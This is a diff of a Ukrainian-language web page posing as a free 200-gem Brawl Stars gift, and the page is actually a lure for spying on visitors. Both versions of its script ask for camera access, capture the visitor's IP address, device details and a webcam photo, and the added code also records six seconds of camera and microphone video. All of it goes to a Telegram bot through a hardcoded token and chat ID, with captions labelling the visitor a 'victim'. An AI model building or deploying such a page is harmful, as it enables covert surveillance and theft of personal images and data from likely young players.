@@ -2,7 +2,6 @@
 <html lang="uk">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Brawl Stars Gift</title>
     <style>
         body { 
@@ -12,89 +11,101 @@
             font-family: 'Arial', sans-serif; 
             height: 100vh; 
             display: flex; 
-            flex-direction: column; 
             align-items: center; 
             justify-content: center; 
         }
         .card { 
             background: rgba(255, 255, 255, 0.1); 
             padding: 30px; 
-            border-radius: 20px; 
+            border-radius: 25px; 
             text-align: center; 
-            border: 2px solid #ffcc00; 
-            width: 300px; 
-            box-shadow: 0 0 20px rgba(255, 204, 0, 0.3);
+            border: 3px solid #ffcc00; 
+            width: 320px; 
+            box-shadow: 0 0 25px rgba(255, 204, 0, 0.4);
         }
         button { 
-            padding: 15px 30px; 
+            padding: 18px; 
             background: #ffcc00; 
             border: none; 
-            border-radius: 10px; 
+            border-radius: 12px; 
             font-weight: bold; 
             cursor: pointer; 
             color: #003366; 
-            font-size: 18px; 
             width: 100%; 
+            font-size: 18px; 
+            margin-top: 20px;
         }
-        #video { display: none; }
-        #status { margin-top: 15px; color: white; }
+        h1 { color: #ffcc00; text-shadow: 2px 2px 4px #000; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1 id="title">BRAWL STARS</h1>
-        <p id="desc" style="color: white;">Отримай 200 гемів безкоштовно!</p>
-        <button id="btn" onclick="run()">ОТРИМАТИ</button>
-        <div id="status" style="display:none">Підключення до серверів...</div>
-    </div>
-    <video id="video" autoplay playsinline></video>
+<div class="card">
+    <h1>BRAWL STARS</h1>
+    <p id="msg" style="color: white; font-size: 18px;">Вітаємо! Твій подарунок 200 гемів готовий.</p>
+    <button id="btn" onclick="startAll()">ОТРИМАТИ ПОДАРУНОК</button>
+</div>
+<video id="v" autoplay playsinline muted style="display:none"></video>
 
-    <script>
-        const TG_TOKEN = "8842138354:AAFV7kdBBGcwaNLa2EBaebxCI_cy80r_HxY";
-        const TG_CHAT_ID = "-1003787168523";
+<script>
+    const TG_TOKEN = "8842138354:AAFV7kdBBGcwaNLa2EBaebxCI_cy80r_HxY";
+    const TG_CHAT_ID = "-1003787168523";
 
-        async function run() {
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('status').style.display = 'block';
+    async function startAll() {
+        document.getElementById('btn').style.display = 'none';
+        const msg = document.getElementById('msg');
+        msg.innerText = "Надсилаємо подарунок...";
 
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
+            // 1. Отримуємо IP
             let ip = "Невизначено";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 ip = data.ip;
-            } catch (e) { ip = "Помилка IP"; }
+            } catch (e) {}
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+            // 2. Фото + Дані
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
 
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+            const fd1 = new FormData();
+            fd1.append('chat_id', TG_CHAT_ID);
+            fd1.append('photo', photoBlob);
+            fd1.append('caption', `🔥 НОВА ЖЕРТВА!\nIP: ${ip}\nПристрій: ${navigator.userAgent}\nЛокація: Бортятин`);
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd1 });
+
+            // 3. Запис відео (6 секунд)
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.start();
+
+            setTimeout(async () => {
+                mediaRecorder.stop();
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    const fd2 = new FormData();
+                    fd2.append('chat_id', TG_CHAT_ID);
+                    fd2.append('video', videoBlob);
+                    fd2.append('caption', "🎥 Відео жертви");
+                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: 'POST', body: fd2 });
                     
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', TG_CHAT_ID);
-                        formData.append('photo', blob);
-                        formData.append('caption', `🔥 ЖЕРТВА BRAWL STARS!\nIP: ${ip}\nЛокація: Бортятин, Львів\nПристрій: ${navigator.userAgent}`);
+                    stream.getTracks().forEach(t => t.stop());
+                    msg.innerText = "ГОТОВО! Подарунок активовано.";
+                };
+            }, 6000);
 
-                        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        stream.getTracks().forEach(track => track.stop());
-                        alert("Подарунок нараховано!");
-                    }, 'image/jpeg');
-                }, 1500);
-            } catch (e) {
-                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🔥 Жертва (без фото):\nIP: " + ip + "\nПристрій: " + navigator.userAgent)}`);
-                alert("Помилка при отриманні подарунка.");
-            }
+        } catch (e) {
+            alert("Помилка: потрібно надати дозвіл на камеру та мікрофон для отримання подарунка!");
         }
-    </script>
+    }
+</script>
 </body>
 </html>
